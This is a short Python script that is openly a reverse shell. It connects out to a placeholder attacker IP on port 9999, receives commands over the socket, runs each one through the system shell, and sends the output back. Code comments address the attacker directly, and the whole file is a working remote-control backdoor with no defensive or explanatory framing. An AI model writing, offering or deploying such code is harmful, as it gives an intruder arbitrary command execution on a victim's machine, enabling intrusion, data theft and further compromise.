import socket
import subprocess

# Connect back to the attacker's machine
server_ip = 'attacker_ip'  # Replace with the attacker's IP
server_port = 9999
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

while True:
    # Receive the command from the attacker
    command = client.recv(1024).decode()

    # Execute the command and send the result back
    result = subprocess.run(command, shell=True, capture_output=True)
    client.send(result.stdout + result.stderr)

client.close()
